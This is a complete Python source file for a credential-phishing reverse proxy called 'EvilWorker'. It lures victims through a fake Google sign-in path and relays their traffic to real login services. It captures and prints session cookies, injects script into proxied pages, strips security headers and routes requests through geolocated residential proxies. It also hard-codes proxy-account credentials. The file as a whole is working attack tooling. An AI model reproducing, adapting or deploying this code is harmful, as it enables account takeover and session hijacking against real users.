import os
import re
import json
import time
import zlib
import base64
import random
import string
import threading
from urllib.parse import urlparse, parse_qs, unquote, quote
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from io import BytesIO

# curl_cffi for browser TLS impersonation
try:
    from curl_cffi import requests as curl_requests
except ImportError:
    curl_requests = None
    print("curl_cffi not installed. Install with: pip install curl_cffi")

# Optional compression libraries
try:
    import brotli
except ImportError:
    brotli = None

try:
    import zstandard as zstd
except ImportError:
    zstd = None

# ==================== CONFIGURATION ====================
PROXY_ENTRY_POINT = "/v3/signin/identifier?authuser=0"
PHISHED_URL_PARAMETER = "continue"
PHISHED_URL_REGEXP = re.compile(rf"(?<={PHISHED_URL_PARAMETER}=)[^&]+")
REDIRECT_URL = "https://www.intrinsec.com/"

PROXY_FILES = {
    "index": "index_smQGUDpTF7PN.html",
    "notFound": "404_not_found_lk48ZVr32WvU.html",
    "script": "script_Vx9Z6XN5uC3k.js"
}
PROXY_PATHNAMES = {
    "proxy": "/lNv1pC9AWPUY4gbidyBO",
    "serviceWorker": "/service_worker_Mz8XO2ny1Pg5.js",
    "script": "/@",
    "mutation": "/Mutation_o5y3f4O7jMGW",
    "jsCookie": "/JSCookie_6X7dRqLg90mH",
    "favicon": "/favicon.ico"
}

LOGS_DIRECTORY = os.path.join(os.path.dirname(os.path.abspath(__file__)), "phishing_logs")
os.makedirs(LOGS_DIRECTORY, exist_ok=True)

ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y"

VICTIM_SESSIONS = {}
LOCK = threading.Lock()

# ==================== GEO-IP & PROXY HELPERS ====================
def get_client_ip(handler):
    forwarded = handler.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return handler.client_address[0] or ""

def get_victim_geo(ip):
    if not ip or ip in ("::1", "127.0.0.1") or ip.startswith(("10.", "192.168.")):
        return None
    try:
        resp = curl_requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,continentCode,countryCode,regionName,city",
            timeout=5,
            impersonate="chrome"
        )
        data = resp.json()
        if data.get("status") == "success":
            return {
                "continent": data.get("continentCode"),
                "country": data.get("countryCode"),
                "region": data.get("regionName", "").replace(" ", ""),
                "city": data.get("city", "").replace(" ", "")
            }
    except Exception as e:
        print(f"Geo-IP lookup failed: {e}")
    return None

def get_session_pool():
    pool_str = os.environ.get("PROXY_SESSION_POOL", "")
    pool = [s.strip() for s in pool_str.split(",") if s.strip()]
    if not pool:
        pool = [generate_random_string(8)]
    return pool

def build_proxy_url(location, session_id):
    host = os.environ.get("PROXY_HOST", "proxy.okeyproxy.com")
    port = os.environ.get("PROXY_PORT", "31212")
    base_user = os.environ.get("PROXY_USER", "customer-j1pv733632")
    passw = os.environ.get("PROXY_PASS", "rl96vvck")

    if not location:
        return f"http://{base_user}:{passw}@{host}:{port}"

    tags = f"-continent-{location['continent']}"
    if location.get("country"):
        tags += f"-country-{location['country']}"
    if location.get("region"):
        tags += f"-region-{location['region']}"
    if location.get("city"):
        tags += f"-city-{location['city']}"

    user = f"{base_user}{tags}-session-{session_id}-time-17"
    return f"http://{user}:{passw}@{host}:{port}"

def generate_random_string(length):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

# ==================== ENCRYPTION HELPERS ====================
def encrypt_data(data_str):
    iv = os.urandom(16)
    # AES-CTR using PyCryptodome (install: pip install pycryptodome)
    from Crypto.Cipher import AES
    from Crypto.Util import Counter
    ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
    cipher = AES.new(ENCRYPTION_KEY.encode('utf-8'), AES.MODE_CTR, counter=ctr)
    encrypted = cipher.encrypt(data_str.encode('utf-8'))
    return {
        "iv": iv.hex(),
        "encryptedData": encrypted.hex()
    }

# ==================== COOKIE MANAGEMENT ====================
def parse_cookie_date(cookie_date):
    # Simplified: use email.utils.parsedate_to_datetime
    from email.utils import parsedate_to_datetime
    try:
        dt = parsedate_to_datetime(cookie_date)
        return dt.timestamp() * 1000
    except:
        return float('nan')

def is_domain_applicable(request_hostname, cookie_domain, cookie_host_only):
    req_parts = request_hostname.split(".")
    cookie_parts = cookie_domain.split(".")
    if len(cookie_parts) < 2:
        return False
    if cookie_host_only and len(req_parts) != len(cookie_parts):
        return False
    if len(req_parts) < len(cookie_parts):
        return False
    for i in range(1, len(cookie_parts)+1):
        if cookie_parts[-i] != req_parts[-i]:
            return False
    return True

def is_path_applicable(request_path, cookie_path):
    if cookie_path == "/":
        return True
    req_parts = request_path.split("/")
    cookie_parts = cookie_path.split("/")
    if len(req_parts) < len(cookie_parts):
        return False
    for i in range(1, len(cookie_parts)):
        if cookie_parts[i] != req_parts[i]:
            return False
    return True

def is_cookie_applicable(request_options, cookie):
    return (is_domain_applicable(request_options.get("hostname", ""), cookie["domain"], cookie["hostOnly"]) and
            is_path_applicable(request_options.get("path", ""), cookie["path"]))

def prepare_proxy_request_cookies(proxy_request_options, current_session):
    cookies_list = VICTIM_SESSIONS[current_session].get("cookies", [])
    now = time.time() * 1000
    cookie_strs = []
    for cookie in cookies_list:
        if not (now > cookie["expires"]) and is_cookie_applicable(proxy_request_options, cookie):
            cookie_strs.append(f"{cookie['name']}={cookie['value']}")
    return "; ".join(cookie_strs)

def update_current_session_cookies(request_options, new_cookies, proxy_hostname, current_session, proxy_response_date=None):
    path_match = re.match(r"^/[^?#]*(?=/)", request_options.get("path", "/"))
    current_timestamp = time.time() * 1000
    clock_skew = 0
    if proxy_response_date:
        parsed_date = parse_cookie_date(proxy_response_date)
        if not (parsed_date != parsed_date):  # not NaN
            clock_skew = current_timestamp - parsed_date

    session = VICTIM_SESSIONS[current_session]
    if "cookies" not in session:
        session["cookies"] = []

    for new_cookie in new_cookies:
        parts = new_cookie.split(";")
        first = parts[0].strip()
        name, _, value = first.partition("=")
        attributes = parts[1:]

        cookie_domain = request_options.get("hostname", "")
        cookie_path = (path_match.group(0) if path_match else "/")
        cookie_expires = float('nan')
        cookie_max_age = ""
        cookie_host_only = True
        is_cookie_valid = True

        for attr in attributes:
            attr = attr.strip()
            if attr.lower() == "domain":
                cookie_domain = request_options["hostname"]
                cookie_host_only = True
                is_cookie_valid = True
            elif attr.lower() == "path":
                cookie_path = (path_match.group(0) if path_match else "/")
            elif attr.lower() == "expires":
                cookie_expires = float('nan')
            elif attr.lower() == "max-age":
                cookie_max_age = ""
            else:
                domain_match = re.match(r"^domain\s*=(.*)$", attr, re.I)
                path_match2 = re.match(r"^path\s*=(.*)$", attr, re.I)
                expires_match = re.match(r"^expires\s*=(.*)$", attr, re.I)
                max_age_match = re.match(r"^max-age\s*=(.*)$", attr, re.I)

                if domain_match:
                    cookie_domain = domain_match.group(1).replace(".", "").strip()
                    cookie_host_only = True
                    is_cookie_valid = True
                    if not cookie_domain:
                        cookie_domain = request_options["hostname"]
                    elif cookie_domain == proxy_hostname:
                        cookie_domain = request_options["hostname"]
                        cookie_host_only = False
                    elif cookie_domain != request_options["hostname"]:
                        if is_domain_applicable(proxy_hostname, cookie_domain, False):
                            cookie_domain = request_options["hostname"].split(".")[-2:]
                            cookie_domain = ".".join(cookie_domain)
                        elif not is_domain_applicable(request_options["hostname"], cookie_domain, False):
                            is_cookie_valid = False
                            continue
                        cookie_host_only = False
                elif path_match2:
                    cookie_path = path_match2.group(1).strip()
                    if not cookie_path.startswith("/"):
                        cookie_path = (path_match.group(0) if path_match else "/")
                elif expires_match:
                    cookie_expires = parse_cookie_date(expires_match.group(1).strip())
                elif max_age_match:
                    cookie_max_age = max_age_match.group(1).strip()
                    if not re.match(r"^-?\d+$", cookie_max_age):
                        cookie_max_age = ""

        if not is_cookie_valid:
            continue

        cookie_expires += clock_skew
        if cookie_max_age:
            seconds = int(cookie_max_age)
            if not (seconds != seconds):
                cookie_expires = current_timestamp + seconds * 1000

        found = False
        for existing in session["cookies"]:
            if (existing["name"] == name and existing["domain"] == cookie_domain and
                existing["path"] == cookie_path and existing["hostOnly"] == cookie_host_only):
                if current_timestamp > cookie_expires:
                    session["cookies"].remove(existing)
                    break
                existing["value"] = value
                existing["expires"] = cookie_expires
                found = True
                break

        if not found and not (current_timestamp > cookie_expires):
            session["cookies"].append({
                "name": name,
                "value": value,
                "domain": cookie_domain,
                "path": cookie_path,
                "expires": cookie_expires,
                "hostOnly": cookie_host_only
            })

def get_valid_domains(domains):
    valid = []
    for domain in domains:
        parts = domain.split(".")
        for i in range(2, len(parts)+1):
            d = ".".join(parts[-i:])
            if d not in valid:
                valid.append(d)
    return valid

# ==================== RESPONSE HELPERS ====================
def decompress_data(data, encoding):
    if encoding == "gzip" or encoding == "x-gzip":
        return zlib.decompress(data, zlib.MAX_WBITS | 16)
    elif encoding == "deflate":
        return zlib.decompress(data)
    elif encoding == "br" and brotli:
        return brotli.decompress(data)
    elif encoding == "zstd" and zstd:
        dctx = zstd.ZstdDecompressor()
        return dctx.decompress(data)
    else:
        return data

def compress_data(data, encoding):
    if encoding == "gzip" or encoding == "x-gzip":
        return zlib.compress(data, zlib.MAX_WBITS | 16)
    elif encoding == "deflate":
        return zlib.compress(data)
    elif encoding == "br" and brotli:
        return brotli.compress(data)
    elif encoding == "zstd" and zstd:
        cctx = zstd.ZstdCompressor()
        return cctx.compress(data)
    else:
        return data

def decompress_response_body(compressed_data, content_encoding):
    if not content_encoding:
        return compressed_data, []
    encodings = [e.strip().lower() for e in content_encoding.split(",") if e.strip()]
    data = compressed_data
    for enc in reversed(encodings):
        data = decompress_data(data, enc)
    return data, encodings

def compress_response_body(data, encodings):
    for enc in encodings:
        data = compress_data(data, enc)
    return data

def update_html_proxy_response(decompressed_body):
    payload = "<script src=/@></script>"
    html_injection_map = {
        "<head>": f"<head>{payload}",
        "<html>": f"<html><head>{payload}</head>",
        "<body>": f"<head>{payload}</head><body>"
    }
    body_str = decompressed_body.decode('utf-8', errors='replace')
    index_limit = 200
    for key, value in html_injection_map.items():
        idx = body_str[:index_limit].find(key)
        if idx != -1:
            return (body_str[:idx] + value + body_str[idx+len(key):]).encode('utf-8')
    return (f"<head>{payload}</head>" + body_str).encode('utf-8')

def update_federation_redirect_url(decompressed_body, proxy_hostname):
    # For Microsoft-specific GetCredentialType response
    try:
        body_str = decompressed_body.decode('utf-8')
        body_obj = json.loads(body_str)
        fed_url = body_obj["Credentials"]["FederationRedirectUrl"]
        proxy_url = f"https://{proxy_hostname}{PROXY_PATHNAMES['mutation']}"
        params = {PHISHED_URL_PARAMETER: fed_url}
        body_obj["Credentials"]["FederationRedirectUrl"] = proxy_url + "?" + "&".join([f"{k}={quote(v)}" for k,v in params.items()])
        return json.dumps(body_obj).encode('utf-8')
    except:
        return decompressed_body

# ==================== HTTP HANDLER ====================
class ProxyHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, format, *args):
        pass  # suppress default logging

    def _send_file(self, filename, content_type="text/html"):
        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
        if not os.path.exists(path):
            self.send_error(404)
            return
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.end_headers()
        with open(path, "rb") as f:
            self.wfile.write(f.read())

    def _send_redirect(self, location):
        self.send_response(301)
        self.send_header("Location", location)
        self.end_headers()

    def do_GET(self):
        self._handle_request()

    def do_POST(self):
        self._handle_request()

    def _handle_request(self):
        url = self.path
        headers = self.headers
        method = self.command

        # Determine current session from cookie
        current_session = self._get_user_session(headers.get("Cookie"))

        # --- Phishing URL entry point ---
        if url.startswith(PROXY_ENTRY_POINT) and PHISHED_URL_PARAMETER in url:
            try:
                match = PHISHED_URL_REGEXP.search(url)
                if not match:
                    raise ValueError("Missing phished URL parameter")
                phished_url_str = unquote(match.group(0))
                phished_url = urlparse(phished_url_str)

                session = current_session
                if not session:
                    cookie_name = generate_random_string(12)
                    cookie_value = generate_random_string(32)
                    self.send_header("Set-Cookie", f"{cookie_name}={cookie_value}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict")
                    session = cookie_name
                    self._create_session(session, cookie_value, phished_url)

                VICTIM_SESSIONS[session]["protocol"] = phished_url.scheme + ":"
                VICTIM_SESSIONS[session]["hostname"] = phished_url.hostname
                VICTIM_SESSIONS[session]["path"] = phished_url.path + (("?" + phished_url.query) if phished_url.query else "")
                VICTIM_SESSIONS[session]["port"] = phished_url.port
                VICTIM_SESSIONS[session]["host"] = phished_url.netloc

                # Initialize proxy state if not already
                if "victimIP" not in VICTIM_SESSIONS[session]:
                    victim_ip = get_client_ip(self)
                    VICTIM_SESSIONS[session]["victimIP"] = victim_ip
                    # Do async geo lookup; we'll start a thread and store result later
                    threading.Thread(target=self._fetch_geo_and_proxy, args=(session, victim_ip), daemon=True).start()

                self._send_file(PROXY_FILES["index"])
                return
            except Exception as e:
                self._send_file(PROXY_FILES["notFound"])
                return

        # --- Service worker file ---
        if url == PROXY_PATHNAMES["serviceWorker"]:
            self._send_file(PROXY_PATHNAMES["serviceWorker"].lstrip("/"), "text/javascript")
            return

        # --- Favicon redirect ---
        if url == PROXY_PATHNAMES["favicon"]:
            if current_session and current_session in VICTIM_SESSIONS:
                sess = VICTIM_SESSIONS[current_session]
                self._send_redirect(f"{sess['protocol']}//{sess['host']}{url}")
            else:
                self._send_redirect(REDIRECT_URL)
            return

        # --- Proxy endpoint (used by service worker) ---
        if current_session or url == PROXY_PATHNAMES["proxy"]:
            content_length = int(headers.get("Content-Length", 0))
            body = self.rfile.read(content_length) if content_length else b""

            if not current_session:
                # New session via proxy endpoint (service worker sends JSON with url)
                if body:
                    try:
                        data = json.loads(body.decode())
                        proxy_url = urlparse(data["url"])
                        proxy_path = proxy_url.path + (("?" + proxy_url.query) if proxy_url.query else "")
                        if proxy_url.hostname == headers.get("Host") and proxy_path.startswith(PROXY_ENTRY_POINT) and PHISHED_URL_PARAMETER in proxy_path:
                            match = PHISHED_URL_REGEXP.search(proxy_path)
                            phished_url_str = unquote(match.group(0))
                            phished_url = urlparse(phished_url_str)
                            cookie_name = generate_random_string(12)
                            cookie_value = generate_random_string(32)
                            self.send_header("Set-Cookie", f"{cookie_name}={cookie_value}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict")
                            session = cookie_name
                            self._create_session(session, cookie_value, phished_url)
                            self._send_redirect(f"{phished_url.scheme}://{headers.get('Host')}{VICTIM_SESSIONS[session]['path']}")
                            return
                        else:
                            self._send_redirect(REDIRECT_URL)
                            return
                    except:
                        self._send_redirect(REDIRECT_URL)
                        return
                else:
                    self._send_redirect(REDIRECT_URL)
                    return

            # ---- Existing session, process proxy request ----
            sess = VICTIM_SESSIONS[current_session]
            proxy_request_protocol = sess["protocol"]
            proxy_request_options = {
                "hostname": sess["hostname"],
                "port": sess["port"],
                "method": method,
                "path": sess["path"],
                "headers": dict(headers),
            }
            is_navigation_request = False

            if body:
                # Handle jsCookie endpoint
                if url == PROXY_PATHNAMES["jsCookie"]:
                    update_current_session_cookies(proxy_request_options, [body.decode()], headers.get("Host"), current_session)
                    valid_domains = get_valid_domains([headers.get("Host"), sess["hostname"]])
                    self._send_json(valid_domains)
                    return

                # Handle proxy endpoint JSON
                if url == PROXY_PATHNAMES["proxy"]:
                    try:
                        data = json.loads(body.decode())
                        proxy_url = urlparse(data["url"])
                        proxy_path = proxy_url.path + (("?" + proxy_url.query) if proxy_url.query else "")

                        if proxy_url.hostname == headers.get("Host"):
                            if proxy_path.startswith(PROXY_ENTRY_POINT) and PHISHED_URL_PARAMETER in proxy_path:
                                # Update target URL
                                match = PHISHED_URL_REGEXP.search(proxy_path)
                                phished_url_str = unquote(match.group(0))
                                phished_url = urlparse(phished_url_str)
                                sess["protocol"] = phished_url.scheme + ":"
                                sess["hostname"] = phished_url.hostname
                                sess["path"] = phished_url.path + (("?" + phished_url.query) if phished_url.query else "")
                                sess["port"] = phished_url.port
                                sess["host"] = phished_url.netloc
                                self._send_redirect(f"{sess['protocol']}//{headers.get('Host')}{sess['path']}")
                                return
                            elif proxy_url.path == PROXY_PATHNAMES["script"]:
                                self._send_file(PROXY_FILES["script"], "text/javascript")
                                return
                            elif proxy_url.path == PROXY_PATHNAMES["mutation"]:
                                phished_url_value = parse_qs(proxy_url.query).get(PHISHED_URL_PARAMETER)
                                if phished_url_value:
                                    new_url = urlparse(unquote(phished_url_value[0]))
                                    proxy_request_protocol = new_url.scheme + ":"
                                    proxy_request_options["path"] = new_url.path + (("?" + new_url.query) if new_url.query else "")
                                    proxy_request_options["port"] = new_url.port
                                    proxy_request_options["method"] = data.get("method", method)
                                    proxy_request_options["headers"] = {**headers, **data.get("headers", {})}
                                    if new_url.hostname != headers.get("Host"):
                                        proxy_request_options["hostname"] = new_url.hostname
                                        proxy_request_options["headers"]["Host"] = new_url.netloc
                                    if proxy_request_options["headers"].get("Referer"):
                                        proxy_request_options["headers"]["Referer"] = data.get("referrer", proxy_request_options["headers"]["Referer"])
                                    is_navigation_request = data.get("mode") == "navigate"
                            elif proxy_url.path == PROXY_PATHNAMES["jsCookie"]:
                                update_current_session_cookies(proxy_request_options, [data.get("body", "")], headers.get("Host"), current_session)
                                valid_domains = get_valid_domains([headers.get("Host"), sess["hostname"]])
                                self._send_json(valid_domains)
                                return
                        else:
                            # Direct request to target domain
                            proxy_request_protocol = proxy_url.scheme + ":"
                            proxy_request_options["path"] = proxy_path
                            proxy_request_options["port"] = proxy_url.port
                            proxy_request_options["method"] = data.get("method", method)
                            proxy_request_options["headers"] = {**headers, **data.get("headers", {})}
                            if proxy_url.hostname != headers.get("Host"):
                                proxy_request_options["hostname"] = proxy_url.hostname
                                proxy_request_options["headers"]["Host"] = proxy_url.netloc
                            if proxy_request_options["headers"].get("Referer"):
                                proxy_request_options["headers"]["Referer"] = data.get("referrer", proxy_request_options["headers"]["Referer"])
                            is_navigation_request = data.get("mode") == "navigate"
                    except Exception as e:
                        self._send_file(PROXY_FILES["notFound"])
                        return

            # Prepare request body
            request_body = None
            if body:
                try:
                    data = json.loads(body.decode())
                    request_body = data.get("body", None)
                except:
                    request_body = body.decode() if body else None

            # Update proxy request headers (cookies, origin, referer, remove azure headers)
            self._update_proxy_request_headers(proxy_request_options, current_session, headers.get("Host"))

            # Remove content-length/type if no body
            if not request_body:
                proxy_request_options["headers"].pop("Content-Type", None)
                proxy_request_options["headers"].pop("Content-Length", None)

            if is_navigation_request:
                sess["protocol"] = proxy_request_protocol
                sess["hostname"] = proxy_request_options["hostname"]
                sess["path"] = proxy_request_options["path"]
                sess["port"] = proxy_request_options["port"]
                sess["host"] = proxy_request_options["headers"]["Host"]

            # Forward request to target using curl_cffi with proxy and impersonation
            self._forward_request(proxy_request_protocol, proxy_request_options, current_session, headers.get("Host"),
                                  request_body, is_navigation_request)
            return

        # Default: redirect to REDIRECT_URL
        self._send_redirect(REDIRECT_URL)

    # Helper methods
    def _create_session(self, session_name, cookie_value, phished_url):
        VICTIM_SESSIONS[session_name] = {
            "value": cookie_value,
            "cookies": [],
            "logFilename": f"{phished_url.hostname}__{time.strftime('%Y-%m-%dT%H:%M:%S')}",
            "protocol": phished_url.scheme + ":",
            "hostname": phished_url.hostname,
            "path": phished_url.path + (("?" + phished_url.query) if phished_url.query else ""),
            "port": phished_url.port,
            "host": phished_url.netloc
        }

    def _get_user_session(self, cookie_header):
        if not cookie_header:
            return None
        cookies = {}
        for part in cookie_header.split(";"):
            if "=" in part:
                name, value = part.strip().split("=", 1)
                cookies[name] = value
        for name, value in cookies.items():
            if name in VICTIM_SESSIONS and VICTIM_SESSIONS[name]["value"] == value:
                return name
        return None

    def _fetch_geo_and_proxy(self, session, ip):
        geo = get_victim_geo(ip)
        with LOCK:
            sess = VICTIM_SESSIONS.get(session)
            if not sess:
                return
            sess["geo"] = geo
            sess["proxyLevels"] = []
            pool = get_session_pool()
            if geo:
                # city level
                for s in pool:
                    sess["proxyLevels"].append({"url": build_proxy_url(geo, s), "level": "city"})
                # region
                geo_no_city = geo.copy()
                geo_no_city["city"] = None
                for s in pool:
                    sess["proxyLevels"].append({"url": build_proxy_url(geo_no_city, s), "level": "region"})
                # country
                geo_country = geo.copy()
                geo_country["region"] = None
                geo_country["city"] = None
                for s in pool:
                    sess["proxyLevels"].append({"url": build_proxy_url(geo_country, s), "level": "country"})
            else:
                for s in pool:
                    sess["proxyLevels"].append({"url": build_proxy_url(None, s), "level": "global"})

    def _update_proxy_request_headers(self, proxy_request_options, current_session, proxy_hostname):
        azure_headers = [
            "max-forwards", "x-arr-log-id", "client-ip", "disguised-host",
            "x-site-deployment-id", "was-default-hostname", "x-forwarded-proto",
            "x-appservice-proto", "x-arr-ssl", "x-forwarded-tlsversion",
            "x-forwarded-for", "x-original-url", "x-waws-unencoded-url",
            "x-client-ip", "x-client-port"
        ]
        headers = proxy_request_options["headers"]
        # Cookies
        cookie_str = prepare_proxy_request_cookies(proxy_request_options, current_session)
        if cookie_str:
            headers["Cookie"] = cookie_str
        else:
            headers.pop("Cookie", None)

        # Origin
        sess = VICTIM_SESSIONS[current_session]
        if headers.get("Origin"):
            headers["Origin"] = f"{sess['protocol']}//{sess['host']}"
        # Referer
        if headers.get("Referer") and (not headers["Referer"] or PROXY_ENTRY_POINT in headers["Referer"]):
            headers.pop("Referer", None)
        # Remove Azure-specific headers and replace hostname
        for key in list(headers.keys()):
            if key.lower() in azure_headers:
                headers.pop(key, None)
            else:
                headers[key] = headers[key].replace(proxy_hostname, sess["host"])

    def _forward_request(self, proxy_request_protocol, proxy_request_options, current_session, proxy_hostname,
                         request_body, is_navigation_request):
        if curl_requests is None:
            self.send_error(500)
            return

        sess = VICTIM_SESSIONS[current_session]
        # Determine proxy agent (use first proxyLevels entry, fallback)
        proxy_url = None
        if "proxyAgent" not in sess:
            if sess.get("proxyLevels"):
                first = sess["proxyLevels"][0]
                proxy_url = first["url"]
                print(f"🌍 Using proxy ({first['level']}): {proxy_url}")
                sess["proxyAgent"] = proxy_url
            else:
                # Fallback global proxy
                proxy_url = build_proxy_url(None, generate_random_string(8))
                print(f"🌍 Using fallback global proxy: {proxy_url}")
                sess["proxyAgent"] = proxy_url
        else:
            proxy_url = sess["proxyAgent"]

        proxies = {"http": proxy_url, "https": proxy_url}
        headers = proxy_request_options["headers"]

        # Remove hop-by-hop headers
        for h in ["Connection", "Keep-Alive", "Proxy-Authenticate", "Proxy-Authorization", "TE", "Trailers", "Transfer-Encoding", "Upgrade"]:
            headers.pop(h, None)

        try:
            target_url = f"{proxy_request_protocol}//{proxy_request_options['hostname']}{proxy_request_options['path']}"
            method = proxy_request_options.get("method", "GET")
            data = request_body.encode() if isinstance(request_body, str) else request_body
            resp = curl_requests.request(
                method,
                target_url,
                headers=headers,
                data=data,
                proxies=proxies,
                impersonate="chrome",
                timeout=30,
                allow_redirects=False  # we handle redirects manually
            )
            self._handle_proxy_response(resp, proxy_request_options, current_session, proxy_hostname,
                                        request_body, is_navigation_request)
        except Exception as e:
            print(f"Proxy request failed: {e}")
            self.send_error(502)

    def _handle_proxy_response(self, resp, proxy_request_options, current_session, proxy_hostname,
                               request_body, is_navigation_request):
        sess = VICTIM_SESSIONS[current_session]

        # Process Set-Cookie headers
        set_cookie_headers = resp.headers.get_all("set-cookie") if hasattr(resp.headers, 'get_all') else [resp.headers.get("set-cookie")]
        set_cookie_headers = [c for c in set_cookie_headers if c]
        if set_cookie_headers:
            update_current_session_cookies(proxy_request_options, set_cookie_headers, proxy_hostname,
                                           current_session, resp.headers.get("date"))
            # Print cookies to console (debug)
            print(f"[COOKIES] Session: {current_session}")
            for cookie in sess["cookies"]:
                print(f"  {cookie['name']}={cookie['value']} (domain={cookie['domain']}, path={cookie['path']})")

        # Handle redirects for navigation
        if is_navigation_request and resp.status_code in (300, 301, 302, 303, 307, 308) and resp.headers.get("location"):
            location = resp.headers["location"]
            try:
                parsed = urlparse(location)
                if parsed.hostname:
                    sess["protocol"] = parsed.scheme + ":"
                    sess["hostname"] = parsed.hostname
                    sess["path"] = parsed.path + (("?" + parsed.query) if parsed.query else "")
                    sess["port"] = parsed.port
                    sess["host"] = parsed.netloc
                    resp.headers["location"] = location.replace(parsed.netloc, proxy_hostname)
                else:
                    sess["path"] = location
            except:
                sess["path"] = location

        # Delete security headers from response
        security_headers = [
            "x-frame-options", "x-xss-protection", "x-content-type-options", "set-cookie",
            "content-security-policy", "content-security-policy-report-only",
            "cross-origin-opener-policy", "cross-origin-embedder-policy",
            "cross-origin-resource-policy", "permissions-policy", "service-worker-allowed"
        ]
        for h in security_headers:
            if h in resp.headers:
                del resp.headers[h]

        # Set cache-control and CORS
        resp.headers["cache-control"] = "no-store"
        resp.headers["access-control-allow-origin"] = f"https://{proxy_hostname}"

        # Prepare response body
        body = resp.content
        if resp.headers.get("content-type") and "text/html" in resp.headers["content-type"] and body:
            content_encoding = resp.headers.get("content-encoding")
            decompressed, encodings = decompress_response_body(body, content_encoding)
            decompressed = update_html_proxy_response(decompressed)
            body = compress_response_body(decompressed, encodings)
            if "content-length" in resp.headers:
                resp.headers["content-length"] = str(len(body))
        elif proxy_request_options["path"].startswith("/common/GetCredentialType"):
            content_encoding = resp.headers.get("content-encoding")
            decompressed, encodings = decompress_response_body(body, content_encoding)
            decompressed = update_federation_redirect_url(decompressed, proxy_hostname)
            body = compress_response_body(decompressed, encodings)
            if "content-length" in resp.headers:
                resp.headers["content-length"] = str(len(body))

        # Send response to victim
        self.send_response(resp.status_code)
        for key, value in resp.headers.items():
            if key.lower() not in ["transfer-encoding", "connection"]:
                self.send_header(key, value)
        self.end_headers()
        self.wfile.write(body)

    def _send_json(self, data):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

def run_server(port=3000):
    server = ThreadingHTTPServer(("0.0.0.0", port), ProxyHandler)
    print(f"EvilWorker Python proxy server listening on port {port}")
    server.serve_forever()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    run_server(port)
